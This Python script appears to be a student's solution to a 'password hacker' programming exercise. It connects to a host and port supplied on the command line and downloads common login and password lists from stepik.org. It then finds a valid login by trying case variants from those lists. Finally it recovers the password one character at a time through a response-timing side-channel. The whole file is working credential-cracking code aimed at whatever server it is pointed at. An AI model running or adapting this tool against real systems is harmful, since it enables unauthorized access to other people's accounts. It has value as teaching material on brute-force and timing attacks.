import argparse
import socket
import itertools
import string
import logging
import inspect
import requests
import os
import json
from time import time

DEBUG_HACK = True


# write your code here
def logger(func):
    def wrap(*args, **kwargs):
        logging.info(
            "%s - line no: %s with args: %s, kwargs: %s",
            func.__name__,
            inspect.getframeinfo(inspect.currentframe().f_back).lineno,
            args,
            kwargs)

        # Call the original function
        result = func(*args, **kwargs)

        # Log the return value
        logging.info("%s returned: %s",
                     func.__name__,
                     result)
        # Return the result
        return result

    return wrap


@logger
def set_args():
    parser = argparse.ArgumentParser(description="Commandline inputs to start Hacking Password script.")
    parser.add_argument("ip_address", type=str,
                        help="like localhost or 127.0.0.1")
    parser.add_argument("port", type=int,
                        help="like 8080")
    parser.add_argument("message", nargs="*",
                        help="string that you want to send, like this is a test",
                        default="")
    return parser


@logger
def get_args() -> argparse:
    parser = set_args()
    return parser.parse_args()


# @logger
def get_brute_force_pass(length: int = 6):
    char_list = string.ascii_letters + string.digits
    for i in range(1, length + 1):
        for combo in itertools.product(char_list, repeat=i):
            yield ''.join(combo)


@logger
def get_typical_credential_files():
    urls = ["https://stepik.org/media/attachments/lesson/255258/logins.txt",
            "https://stepik.org/media/attachments/lesson/255258/passwords.txt"]
    ans = {}  # Initialize an empty dictionary

    for url in urls:
        filename = url.split("/")[-1]
        keyname = filename.split(".")[0]  # Extract the filename without extension

        response = requests.get(url)
        if DEBUG_HACK:
            logging.info([filename, response])
        if response.status_code == 200:
            current_working_dir = os.getcwd()

            with open(filename, "wb") as file:  # write file to HDD
                file.write(response.content)
            with open(filename, "rb") as file:
                lines_bytes = file.readlines()
                ans[keyname] = [line_byte.decode("utf-8").rstrip("\r\n") for line_byte in lines_bytes]
        else:
            print("Failed to download the file.")
    return ans


@logger
def test_password(client_socket, pw: str) -> str:
    # logging.info(["testing password", pw])
    message = str(pw).encode()
    # logging.info(["message: %s", message])
    client_socket.send(message)
    response = client_socket.recv(10240)
    response = response.decode()
    # logging.info(["password searched: %s, message sent %s, response received %s", pw, message, response])
    if response == "Connection success!":
        logging.info(["password found!"])
        # print(pw)
        return pw
    elif response == "Wrong password!":
        logging.info([pw, message, response])
        return response
    elif response == "Too many attempts":
        logging.info([pw, message, response])
        return response


def test_credentials(client_socket, message_json: dict) -> str:
    if DEBUG_HACK:
        logging.info("testing credentials", message_json)
    message = json.dumps(message_json).encode()
    if DEBUG_HACK:
        logging.info("message: %s", message)
    try:
        client_socket.send(message)
        response = client_socket.recv(102400)
        response = response.decode()
    except Exception as e:
        logging.warning("server didn't answer: %s", e)

    try:
        response = json.loads(response)
    except Exception as e:
        response: dict = {"result": "warning - response was no JSON"}
        logging.warning("response no JSON")
        exit()
    if DEBUG_HACK:
        logging.info("password searched: %s, message sent %s, response received %s", message_json, message, response)
    return response["result"]


@logger
def get_dict_pass(hostname, port) -> dict:
    typical_credentials = get_typical_credential_files()

    with socket.socket() as client_socket:
        address = (hostname, port)
        try:
            client_socket.connect(address)
        except Exception as e:
            logging.info("try to connect after credentials were found. %s", e)
            exit()
        # search for login
        login_found = False
        while not login_found:
            for typical_login in typical_credentials.get('logins'):
                char_combinations = [[letter.lower(), letter.upper()]
                                     if isinstance(letter, str)
                                     else [letter] for letter in typical_login]
                login_combinations = [''.join(x) for x in itertools.product(*char_combinations)]
                for str_login in login_combinations:
                    ans = test_credentials(client_socket,
                                           create_login_json(login=str_login, password=''))
                    if ans != "Wrong login!":
                        login_found = True
                        valid_login = str_login
                        if DEBUG_HACK:
                            logging.info("login found: %s with this answer: %s", typical_login, ans)
        # search for password
        password_found = False
        password = ''
        while not password_found:
            time_series = {}
            for char in string.ascii_letters + string.digits:
                password_new = password + char
                if DEBUG_HACK:
                    logging.info(password_new)
                credentials_json = create_login_json(login=valid_login,
                                                     password=password_new)
                start_time = time()
                ans = test_credentials(client_socket,
                                       credentials_json)
                time_series[char] = time() - start_time
                if ans == "Connection success!":
                    password_found = True
                    logging.info("!!Credentials found - exit loop!!: %s", credentials_json)
                    return credentials_json
            max_key = max(time_series, key=time_series.get)
            password += max_key
            if DEBUG_HACK:
                logging.info("password so far %s", password)
    return None


@logger
def send_message_and_get_response(hostname: str, port: int, message: dict = "") -> socket:
    with socket.socket() as client_socket:
        address = (hostname, port)
        client_socket.connect(address)
        test_credentials(client_socket, message)


def create_login_json(login: str, password: str) -> dict:
    user_data = {
        "login": login,
        "password": password
    }
    return user_data


@logger
def main():
    args = get_args()
    # ans = send_message_and_get_response(args.ip_address,
    #                                     args.port)
    # ans = get_dict_pass(args.ip_address, args.port)
    ans = get_dict_pass(args.ip_address, args.port)
    print(json.dumps(ans))


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        filename='app.log',  # Specify the file name for logging
                        filemode='w'  # Use 'w' mode to overwrite the log file on each run, or 'a' to append
                        )
    main()
